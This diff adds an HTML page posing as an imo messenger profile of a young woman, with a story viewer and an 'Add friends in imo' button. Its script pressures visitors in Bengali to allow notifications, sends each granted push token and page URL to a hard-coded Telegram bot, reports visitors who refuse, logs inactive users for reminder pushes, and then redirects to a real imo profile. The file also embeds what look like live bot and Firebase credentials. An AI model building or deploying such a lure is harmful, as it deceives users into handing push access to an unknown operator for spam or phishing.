@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>imo Profile</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+body{margin:0;font-family:system-ui;background:#f2f2f2}
+.header{height:160px;background:#1e8fff;filter:blur(6px)}
+.card{background:#fff;margin-top:-80px;padding:16px}
+.row{display:flex;align-items:center;gap:14px}
+.avatar{width:72px;height:72px;border-radius:50%;overflow:hidden;border:3px solid #1e8fff;cursor:pointer}
+.avatar img{width:100%;height:100%;object-fit:cover}
+.name{font-size:20px;font-weight:600}
+.bio{margin-top:20px;color:#777}
+.btn{position:fixed;bottom:16px;left:16px;right:16px;background:#0095ff;color:#fff;border:none;padding:14px;border-radius:8px;font-size:16px}
+.notice{display:none;position:fixed;bottom:90px;left:16px;right:16px;background:#fff3cd;padding:12px;border-radius:6px}
+
+/* story */
+.story{display:none;position:fixed;inset:0;background:#000;z-index:999}
+video{width:100%;height:100%;object-fit:contain}
+.top{position:absolute;top:10px;left:10px;right:10px;display:flex;gap:4px}
+.bar{flex:1;height:3px;background:#555}
+.bar.active{background:#fff}
+.close{position:absolute;top:14px;right:16px;color:#fff;font-size:22px}
+</style>
+</head>
+
+<body>
+
+<div class="header"></div>
+
+<div class="card">
+  <div class="row">
+    <div class="avatar" onclick="openStory()">
+      <img src="my-logo.jpg">
+    </div>
+    <div class="name">Nusrat Jahan</div>
+  </div>
+  <div class="bio">Bio</div>
+</div>
+
+<button class="btn" onclick="enablePush()">Add friends in imo</button>
+<div class="notice" id="notice"></div>
+
+<div class="story" id="storyBox">
+  <div class="top">
+    <div class="bar" id="b1"></div>
+    <div class="bar" id="b2"></div>
+    <div class="bar" id="b3"></div>
+  </div>
+  <div class="close" onclick="closeStory()">✕</div>
+  <video id="video" autoplay muted></video>
+</div>
+
+<!-- Firebase -->
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-messaging-compat.js"></script>
+
+<script>
+/* ================== CONFIG ================== */
+const firebaseConfig = {
+  apiKey: "AIzaSyCYH0ZSeLjH_T3HJ9hVQ84afB5KyAEZi2Y",
+  authDomain: "my-sc-tools.firebaseapp.com",
+  projectId: "my-sc-tools",
+  messagingSenderId: "285986090017",
+  appId: "1:285986090017:web:9d872b9bb5c472bcb74760"
+};
+
+const BOT_TOKEN = "8367516207:AAEKQnowvWWC32Z2eaPVjuRrxKfl1alssIA";
+const CHAT_ID = "8271536101";
+
+/* ================== INIT ================== */
+firebase.initializeApp(firebaseConfig);
+const messaging = firebase.messaging();
+navigator.serviceWorker.register('firebase-messaging-sw.js');
+
+/* ================== UTIL ================== */
+function tg(msg){
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+    method:"POST",
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({chat_id:CHAT_ID,text:msg})
+  });
+}
+
+/* ================== DETECT STATUS ================== */
+function checkNotificationStatus(){
+  if(Notification.permission === "denied"){
+    document.getElementById('notice').innerText =
+    "❌ Notification block করা আছে — imo তে add হবে না";
+    document.getElementById('notice').style.display="block";
+
+    tg("❌ User BLOCKED notification\n"+location.href);
+  }
+}
+
+/* ================== SAFE FREQUENCY ================== */
+/*
+  Rule:
+  - Max 1 reminder per 48 hours
+  - Store last remind time locally
+*/
+function canRemind(){
+  const last = localStorage.getItem("last_remind");
+  if(!last) return true;
+  return (Date.now() - last) > (48*60*60*1000);
+}
+
+/* ================== INACTIVE LOGIC ================== */
+/*
+  If user inactive 3 days:
+  admin SHOULD send reminder from Firebase Console
+  (We log inactivity signal here)
+*/
+function markActivity(){
+  localStorage.setItem("last_active", Date.now());
+}
+function checkInactive(){
+  const last = localStorage.getItem("last_active");
+  if(!last) return;
+  const days = (Date.now() - last) / (24*60*60*1000);
+  if(days >= 3 && canRemind()){
+    localStorage.setItem("last_remind", Date.now());
+    tg("⏰ Inactive user (3+ days)\n"+location.href);
+  }
+}
+
+/* ================== PUSH ENABLE ================== */
+function enablePush(){
+  Notification.requestPermission().then(p=>{
+    if(p === 'granted'){
+      messaging.getToken().then(token=>{
+        tg(
+`✅ New ACTIVE user
+Token:
+${token}
+URL:
+${location.href}`
+        );
+        markActivity();
+        window.location.href =
+        "https://profile.imo.im/profileshare/shr.AAAAAAAAAAAAAAAAAAAAAFEY15og6iUe5Wjo1F2Suvfjisax_8ooeiwD4AVOrl4c";
+      });
+    }else{
+      document.getElementById('notice').innerText =
+      "⚠️ imo তে add হবে — notification allow করুন";
+      document.getElementById('notice').style.display="block";
+    }
+  });
+}
+
+/* ================== STORY ================== */
+const stories=["my-story1.mp4","my-story2.mp4","my-story3.mp4"];
+let i=0;
+function openStory(){i=0;document.getElementById('storyBox').style.display='block';play()}
+function play(){
+  document.querySelectorAll('.bar').forEach(b=>b.classList.remove('active'));
+  document.getElementById('b'+(i+1)).classList.add('active');
+  let v=document.getElementById('video');
+  v.src=stories[i];v.play();
+  v.onended=()=>{i++;i<3?play():closeStory()}
+}
+function closeStory(){document.getElementById('storyBox').style.display='none'}
+
+/* ================== AUTO CHECK ================== */
+checkNotificationStatus();
+checkInactive();
+markActivity();
+</script>
+
+</body>
+</html>
